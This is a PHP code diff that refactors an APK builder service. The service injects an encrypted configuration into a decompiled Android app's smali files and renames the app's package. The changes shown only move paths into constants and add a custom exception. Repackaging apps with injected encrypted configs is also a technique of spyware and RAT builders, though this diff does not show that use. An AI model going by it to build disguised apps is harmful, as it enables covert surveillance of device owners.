@@ -4,6 +4,7 @@ declare(strict_types=1);
 
 namespace App\Services\ApkBuilder;
 
+use App\Exceptions\ApkBuilder\ApkBuildException;
 use Illuminate\Support\Facades\File;
 use RecursiveDirectoryIterator;
 use RecursiveIteratorIterator;
@@ -49,10 +50,12 @@ final class SmaliProcessor
 
     public function modifyConfig(ApkBuildConfig $config, string $assetsKey, Encryptor $encryptor): void
     {
-        $smaliPath = $this->buildDir . '/smali/com/icontrol/protector/My_Configs.smali';
+        $smaliPath = $this->buildDir . '/' . ApkBuilderConstants::CONFIGS_SMALI_RELATIVE;
 
         if (!File::exists($smaliPath)) {
-            throw new \RuntimeException("My_Configs.smali not found at: {$smaliPath}");
+            throw new ApkBuildException("My_Configs.smali not found at: {$smaliPath}", [
+                'path' => $smaliPath,
+            ]);
         }
 
         $content = File::get($smaliPath);
@@ -110,17 +113,7 @@ final class SmaliProcessor
         $oldPath = str_replace('.', '/', $oldPackage);
         $newPath = str_replace('.', '/', $newPackage);
 
-        $smaliDirs = [
-            'smali',
-            'smali_classes2',
-            'smali_classes3',
-            'smali_classes4',
-            'smali_classes5',
-            'smali_classes6',
-            'smali_classes7',
-        ];
-
-        foreach ($smaliDirs as $smaliDir) {
+        foreach (ApkBuilderConstants::SMALI_DIRS as $smaliDir) {
             $basePath = $this->buildDir . '/' . $smaliDir;
 
             if (!File::isDirectory($basePath)) {
